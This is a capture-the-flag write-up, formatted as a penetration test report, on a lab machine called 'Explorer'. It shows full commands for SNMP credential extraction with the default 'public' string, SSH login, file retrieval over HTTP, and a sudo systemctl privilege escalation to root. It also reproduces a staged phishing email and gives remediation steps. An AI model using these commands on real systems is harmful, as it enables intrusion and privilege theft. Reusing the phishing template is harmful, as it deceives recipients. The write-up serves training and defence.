# Explorer Penetration Test Report

---
https://app.hackviser.com/scenarios/explorer

## Executive Summary

This report documents a comprehensive security assessment conducted on the target system hosted at `alexriveraexplorer.hv` (172.20.36.127). The assessment identified critical security vulnerabilities that enabled complete system compromise, from initial reconnaissance to root-level access.

**Key Findings:**
- **Critical:** Information disclosure via SNMP service with default community string
- **Critical:** Cleartext credentials exposed through SNMP OID tree
- **High:** Sudo misconfiguration on systemctl binary (`NOPASSWD`)
- **Critical:** Phishing infrastructure and malware stored in plaintext in root directory

The exploitation chain progressed from SNMP information disclosure to SSH access, privilege escalation, and ultimately root access. Sensitive data including threat actor credentials, contact numbers, target organization information, and malware hash values were successfully obtained.

---

## 1. Enumeration

### 1.1 Initial Setup

The target domain was mapped to the local network environment by editing the hosts file:

```bash
sudo nano /etc/hosts
```

The following entry was added:

```
172.20.36.127 alexriveraexplorer.hv
```

### 1.2 Network Service Discovery

The initial reconnaissance phase commenced with comprehensive network service scanning using Nmap to identify exposed attack surfaces:

```bash
nmap -sVC -T4 172.20.36.127
```

**Scan Results:**

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-18 14:02 +0300
Nmap scan report for alexriveraexplorer.hv (172.20.36.127)
Host is up (0.14s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 5a:bc:c1:64:1b:a8:93:67:8c:a5:3a:c9:5e:28:94:50 (RSA)
|   256 71:07:65:ed:45:e7:b6:a5:18:c4:89:be:bc:fe:fb:01 (ECDSA)
|_  256 1f:7f:9d:f3:96:52:6f:b8:90:7e:dc:8e:b2:d6:2c:1d (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Home - Alex Rivera
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.45 seconds
```

**Identified Services:**

1. **SSH (Port 22):** OpenSSH 8.4p1 Debian - Current version with no publicly disclosed critical vulnerabilities. Potential entry point contingent upon credential acquisition.

2. **HTTP (Port 80):** Apache httpd 2.4.56 - Hosting a personal portfolio website titled "Home - Alex Rivera".

### 1.3 Web Application Discovery

Investigation of `http://alexriveraexplorer.hv` revealed a photography portfolio and contact page. Upon examining the contact page (`/contact.html`):

**Finding #1:** Contact email address discovered: `contact@alexriveraexplorer.hv`

Standard web reconnaissance techniques (directory brute-forcing with Gobuster, Dirbuster) yielded no administrative interfaces or hidden directories. No obvious exploitation vectors were detected within the web application layer.

---

## 2. Exploitation: SNMP Information Disclosure

### 2.1 Alternative Attack Vector Discovery

After exhausting web-based attack vectors, attention shifted to alternative information disclosure channels. The target system was examined for SNMP service availability, a protocol frequently misconfigured in production environments.

**Attack Rationale:**

Web applications with dynamic content management features such as image galleries commonly utilize backend automation scripts for:
- Image resizing and thumbnail generation
- Metadata extraction (EXIF data processing)
- Automated backup operations
- Content indexing and cataloging

System administrators frequently configure Net-SNMP with the `extend` directive to monitor these custom scripts via SNMP OID queries. When improperly secured with default community strings (such as "public"), these OID trees become accessible to unauthorized parties.

### 2.2 SNMP Discovery and Information Extraction

The `nsExtendOutput2Table` OID of the SNMP service was queried. This OID is part of the Net-SNMP extension framework and is designed to expose custom script outputs through SNMP queries:

```bash
snmpwalk -v 2c -c public -Oa alexriveraexplorer.hv .1.3.6.1.4.1.8072.1.3.2
```

**Command Breakdown:**
- `-v 2c`: Specifies SNMP version 2c (community-based authentication)
- `-c public`: Utilizes default community string "public"
- `-Oa`: Enables ASCII string output format for readability
- `.1.3.6.1.4.1.8072.1.3.2`: Queries the `nsExtendOutput2Table` OID

**Critical Finding:**

The SNMP query successfully extracted cleartext credentials embedded within script output:

```
...
Creds:
Username: explorer
Password: gnw2vejVkbatTM
...
```

**Finding #2:** SSH credentials discovered: `explorer:gnw2vejVkbatTM`

**Vulnerability Analysis:**

This information disclosure encompasses the following security flaws:
1. **Default Community String:** The system accepts the "public" community string
2. **Cleartext Credentials:** Credentials stored and transmitted without encryption
3. **Inadequate Access Controls:** No IP filtering or ACLs restricting SNMP queries
4. **Sensitive Data in Monitoring Tools:** Credentials should never be exposed through monitoring protocols

This vulnerability constitutes a **critical severity information disclosure** flaw (CVSS Base Score: 9.8 - Critical).

---

## 3. Initial Access: SSH Authentication

### 3.1 Credential Verification

Authentication was attempted against the SSH service using credentials obtained via SNMP:

```bash
ssh explorer@alexriveraexplorer.hv
```

**Credentials Used:**
- **Username:** explorer
- **Password:** gnw2vejVkbatTM

**Successful Authentication:**

```
explorer@alexriveraexplorer.hv's password:
Linux debian 5.10.0-27-amd64 #1 SMP Debian 5.10.205-2 (2023-12-31) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
explorer@debian:~$
```

**Result:** Shell access obtained as the `explorer` user, establishing a foothold on the target system.

**Security Detection Notes:**
1. **Credential Reuse:** Credentials obtained from SNMP were valid for SSH
2. **No Multi-Factor Authentication:** SSH access lacked secondary authentication mechanisms
3. **Direct Shell Access:** No additional security layers such as SSH key enforcement or bastion hosts

### 3.2 Post-Exploitation Reconnaissance

Initial reconnaissance conducted within the compromised user context revealed sensitive files:

```bash
explorer@debian:~$ ls -la
Hotel_Reservation_Confirmation.pdf  whatsapp_conversation_log.txt
```

### 3.3 Sensitive File Analysis

**File #1: whatsapp_conversation_log.txt**

```bash
cat whatsapp_conversation_log.txt
```

This file contained a complete WhatsApp conversation transcript between two individuals discussing malware development and deployment targeting rival organizations:

```
[01/01/2024] Ethan Wright [+1-234-567-8901]: Hey Chris, got your message about the new project. What's up?
[01/01/2024] Chris Morgan [+1-987-654-3210]: Hey Ethan. I've got a proposal for you. It's quite sensitive, so I need your discretion.
[01/01/2024] Ethan Wright [+1-234-567-8901]: Understandable, I'm all ears.
[01/01/2024] Chris Morgan [+1-987-654-3210]: We're looking into deploying a piece of software that... let's say, will give us an advantage over our competitors. We think you're the right person for the job.
[01/01/2024] Ethan Wright [+1-234-567-8901]: Sounds intriguing, but what exactly are we talking about here?
[01/01/2024] Chris Morgan [+1-987-654-3210]: It's a software that can disrupt our competitors' operations. Technically, it's on the edge, but the rewards could be huge.
[01/01/2024] Ethan Wright [+1-234-567-8901]: You're talking about malware, aren't you?
[01/01/2024] Chris Morgan [+1-987-654-3210]: Let's not get caught up in definitions. It's a tool that could ensure our dominance in the market.
```

**Extracted Intelligence:**
- **Threat Actor:** Ethan Wright (+1-234-567-8901)
- **Accomplice:** Chris Morgan (+1-987-654-3210)
- **Compensation:** $4,000 for malware development and deployment
- **Motive:** Industrial espionage and competitive sabotage

**Finding #3:** Threat actor phone number: `+1-234-567-8901` (Ethan Wright)

**File #2: Hotel_Reservation_Confirmation.pdf**

The file was exfiltrated to the attacker host for forensic analysis:

```bash
# On target system (explorer user):
python3 -m http.server 8080
```

```bash
# On attacker host:
wget http://172.20.36.127:8080/Hotel_Reservation_Confirmation.pdf
```

**Document Contents:**

```
Name: Ethan Wright
Hotel Name: The British Elegance Hotel
Check-in Date: February 20, 2024
Check-out Date: February 23, 2024
Number of Guests: 2
Room Type: Deluxe Double Room
Price: £450 (inclusive of all taxes)
```

**Finding #4:** Threat actor accommodation information: The British Elegance Hotel

This document corroborated the threat actor's identity and provided geolocation intelligence for law enforcement coordination.

---

## 4. Privilege Escalation

### 4.1 Sudo Permissions Discovery

Privilege escalation was necessary to access restricted directories (specifically `/root`) and examine campaign infrastructure details:

```bash
sudo -l
```

**Output:**

```
Matching Defaults entries for explorer on debian:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User explorer may run the following commands on debian:
    (ALL) NOPASSWD: /bin/systemctl
```

### 4.2 Critical Finding: systemctl Sudo Misconfiguration

**Technical Analysis:**

The `explorer` user possessed unrestricted sudo access to `/bin/systemctl` without password authentication. The systemctl binary, used for managing systemd services, can be exploited to execute arbitrary commands with root privileges by creating malicious service unit files.

**Exploitation Mechanism:**

1. **Systemctl Link Capability:** The `systemctl link` command permits registration of arbitrary service files from any filesystem location
2. **ExecStart Directive Execution:** Service unit files execute `ExecStart` commands with root privileges during service initialization
3. **SUID Bit Persistence:** Setting the SUID bit on `/bin/bash` creates a persistent privilege escalation mechanism
4. **Bash -p Parameter:** The `-p` parameter prevents bash from dropping elevated privileges when invoked with SUID

### 4.3 Exploitation: Privilege Escalation to Root

```bash
# Create temporary service file
TF=$(mktemp).service

# Define malicious service that sets SUID bit on /bin/bash
cat << EOF > $TF
[Service]
Type=oneshot
ExecStart=/bin/chmod +s /bin/bash
[Install]
WantedBy=multi-user.target
EOF

# Register service with systemd
sudo /bin/systemctl link $TF

# Enable and start the service
sudo /bin/systemctl enable --now $TF

# Spawn privileged shell via SUID bash
/bin/bash -p
```

**Execution Results:**

```
Created symlink /etc/systemd/system/tmp.V6oTULnzIa.service → /tmp/tmp.V6oTULnzIa.service.
Created symlink /etc/systemd/system/multi-user.target.wants/tmp.V6oTULnzIa.service → /tmp/tmp.V6oTULnzIa.service.
bash-5.1# whoami
root
```

**Result:** Root access successfully obtained.

```bash
bash-5.1# whoami
root
bash-5.1#
```

This vulnerability constitutes a **critical privilege escalation flaw** (CVSS Base Score: 8.8 - High), enabling any user with systemctl sudo access to trivially obtain root privileges.

---

## 5. Post-Exploitation and Data Collection

### 5.1 Root Directory Discovery

Upon establishing root access, critical infrastructure components were discovered:

```bash
cd /root
ls -la
```

**Discovered Files:**

```
phishing_email.txt
update.exe
```

### 5.2 Phishing Campaign Infrastructure

**File: phishing_email.txt**

```bash
cat phishing_email.txt
```

**Contents:**

```
From: itdepartment@greenhealthsolutions.hv

To:
j.smith@greenhealthsolutions.hv
emily.jones@greenhealthsolutions.hv
michael.brown@greenhealthsolutions.hv
lisa.wilson@greenhealthsolutions.hv
daniel.johnson@greenhealthsolutions.hv
sara.miller@greenhealthsolutions.hv
chris.davis@greenhealthsolutions.hv
olivia.garcia@greenhealthsolutions.hv
mark.lee@greenhealthsolutions.hv
jennifer.taylor@greenhealthsolutions.hv

Subject: Urgent: Software Update Required for All Employees

Dear Team,

We hope this message finds you well. As part of our ongoing efforts to improve our network security and efficiency, the IT department is rolling out a new software update that is mandatory for all employees.

This update includes essential security enhancements and performance improvements to ensure the integrity and reliability of our work environment.

To complete this update, please click on the link below and follow the instructions to install the new software. The process is quick and straightforward, and it must be completed by the end of the week to maintain network access.

For any questions or concerns, please do not hesitate to contact the IT department directly.

Thank you for your immediate attention to this matter and for your continued cooperation.

Best regards,
IT Department
```

**Technical Analysis:**

This document constitutes a sophisticated spear-phishing template designed to impersonate the IT department of **greenhealthsolutions.hv**. The attack methodology employs:

1. **Authority Impersonation:** Spoofing the legitimate IT department email address
2. **Urgency Tactics:** Mandatory compliance deadline to pressure immediate action
3. **Social Engineering:** Leveraging security improvement narratives to bypass user suspicion
4. **Malware Delivery:** Link-based payload distribution mechanism

**Finding #5:** Target organization identified: `greenhealthsolutions.hv`

**Finding #6:** Targeted victim count: 10 employees

### 5.3 Malware Analysis

**File: update.exe**

Cryptographic hash analysis was performed for threat intelligence correlation:

```bash
md5sum update.exe
```

**Hash Value:**

```
30e40e4e8c5ca8298aec30e040fc9e0e  update.exe
```

**Technical Details:**

- **MD5 Hash:** `30e40e4e8c5ca8298aec30e040fc9e0e`
- **File Type:** Windows Portable Executable (.exe)
- **Purpose:** Malicious payload for distribution via phishing campaign
- **Distribution Method:** Link embedded in phishing email template

**Finding #7:** Malware hash value: `30e40e4e8c5ca8298aec30e040fc9e0e`

This hash serves as an Indicator of Compromise (IoC) for threat intelligence platforms, enabling detection across security infrastructure and correlation with known malware families.

```bash
root@debian:/root# md5sum update.exe
30e40e4e8c5ca8298aec30e040fc9e0e  update.exe
root@debian:/root#
```

---

## 6. Conclusion and Remediation

### 6.1 Summary of Findings

This assessment successfully compromised the Explorer infrastructure through a multi-stage attack chain:

1. **SNMP Information Disclosure:** Cleartext credentials exposed via default community string
2. **SSH Access:** System access obtained using exposed credentials
3. **Sensitive Data Discovery:** Threat actor contact information and operational intelligence
4. **Privilege Escalation:** Root access via systemctl sudo misconfiguration
5. **Phishing Infrastructure Discovery:** Target organization, malware, and campaign materials

### 6.2 Remediation Recommendations

**Critical Priority:**

1. **SNMP Service Hardening**
   - If unused, completely disable the SNMP daemon:
     ```bash
     systemctl stop snmpd
     systemctl disable snmpd
     ```
   - Implement strong, cryptographically random community strings (minimum 32 characters)
   - Configure ACLs restricting SNMP queries to authorized management hosts only:
     ```
     # /etc/snmp/snmpd.conf
     rocommunity StrongRandomString 10.0.0.0/8
     ```
   - Migrate to SNMPv3 with authentication and encryption:
     ```
     createUser snmpadmin SHA strongAuthPass AES strongPrivPass
     rouser snmpadmin priv
     ```
   - Remove all credentials and sensitive data from SNMP output

2. **Credential Management Implementation**
   - Completely remove cleartext credentials from monitoring systems
   - Implement encrypted credential storage (HashiCorp Vault, AWS Secrets Manager)
   - Establish mandatory 90-day password rotation policies
   - Audit all configuration files, scripts, and databases for hardcoded credentials

3. **Sudo Privilege Separation**
   - Remove NOPASSWD sudo access for systemctl:
     ```bash
     # Remove from /etc/sudoers:
     explorer ALL=(ALL) NOPASSWD: /bin/systemctl
     ```
   - Implement Principle of Least Privilege - grant sudo access only for specific service operations:
     ```
     # Example: Allow only specific service restarts
     explorer ALL=(ALL) NOPASSWD: /bin/systemctl restart nginx
     ```
   - Enable sudo logging to monitor privilege escalation attempts:
     ```
     Defaults logfile="/var/log/sudo.log"
     Defaults log_input, log_output
     ```

**High Priority:**

4. **Sensitive Data Protection**
   - Immediately secure all malicious materials for law enforcement investigation
   - Deploy full disk encryption (LUKS) for sensitive storage
   - Implement SELinux or AppArmor mandatory access controls
   - Deploy DLP solution to monitor and prevent unauthorized sensitive data storage

5. **SSH Hardening**
   - Disable password authentication and enforce SSH key authentication:
     ```
     # /etc/ssh/sshd_config
     PasswordAuthentication no
     PubkeyAuthentication yes
     ```
   - Implement multi-factor authentication using Google Authenticator or hardware tokens
   - Deploy Fail2ban for automated IP blocking after failed authentication attempts
   - Restrict SSH connectivity to known management networks

6. **Incident Response Actions**
   - Report phishing campaign and malware distribution to law enforcement
   - Warn **greenhealthsolutions.hv** organization of impending attack
   - Submit IoCs to threat intelligence platforms:
     - **Malware MD5:** 30e40e4e8c5ca8298aec30e040fc9e0e
     - **Threat Actor Contact:** +1-234-567-8901 (Ethan Wright)
     - **Command & Control:** alexriveraexplorer.hv (172.20.36.127)
   - Conduct full disk forensics to identify campaign scope and potential victim count
   - Disable explorer account and rotate all system credentials

**Medium Priority:**

7. **Security Monitoring**
   - Deploy intrusion detection system (IDS) for SNMP querying and privilege escalation attempts
   - Implement file integrity monitoring (FIM) on critical configuration files
   - Enable auditd for comprehensive auditing of security events

8. **Network Segmentation**
   - Implement VLAN segmentation to separate management traffic from production networks
   - Restrict SNMP access to dedicated management network
   - Deploy host-based firewall rules to control access to critical services

### 6.3 Security Implications

The identified vulnerabilities represent a complete security failure allowing unauthorized actors to:
- Extract sensitive system credentials
- Access threat actor operational intelligence
- Achieve root-level system compromise
- Discover active phishing campaign infrastructure and malware
- Uncover evidence of malicious activities targeting third-party organizations

Immediate remediation and incident response actions are required to prevent exploitation by malicious actors and harm to the target organization.

### 6.4 Compliance Violations

The identified vulnerabilities and malicious activities constitute violations of:
- **Computer Fraud and Abuse Act (CFAA):** Unauthorized access and malware distribution
- **GDPR Article 32:** Inadequate technical and organizational security measures
- **PCI DSS Requirement 2.2.4:** Insecure default configurations (SNMP community strings)
- **SOC 2 CC6.1:** Inadequate logical access controls

---

## 7. Command Reference

### Reconnaissance Commands
```bash
# Initial network scan
nmap -sVC -T4 172.20.36.127

# SNMP discovery
snmpwalk -v 2c -c public -Oa alexriveraexplorer.hv .1.3.6.1.4.1.8072.1.3.2
```

### Exploitation Commands
```bash
# SSH authentication
ssh explorer@alexriveraexplorer.hv

# File exfiltration
python3 -m http.server 8080
wget http://172.20.36.127:8080/Hotel_Reservation_Confirmation.pdf
```

### Privilege Escalation Commands
```bash
# Sudo discovery
sudo -l

# Systemctl exploitation
TF=$(mktemp).service
cat << EOF > $TF
[Service]
Type=oneshot
ExecStart=/bin/chmod +s /bin/bash
[Install]
WantedBy=multi-user.target
EOF
sudo /bin/systemctl link $TF
sudo /bin/systemctl enable --now $TF
/bin/bash -p
```

### Post-Exploitation Commands
```bash
# Root directory discovery
cd /root
ls -la

# Malware hash analysis
md5sum update.exe
```

---

**Report Creation Date:** 2026-01-18

**Assessment Type:** Capture The Flag (CTF) Security Exercise

**Target System:** Explorer (alexriveraexplorer.hv)

**MacallanTheRoot**: https://github.com/MacallanTheRoot
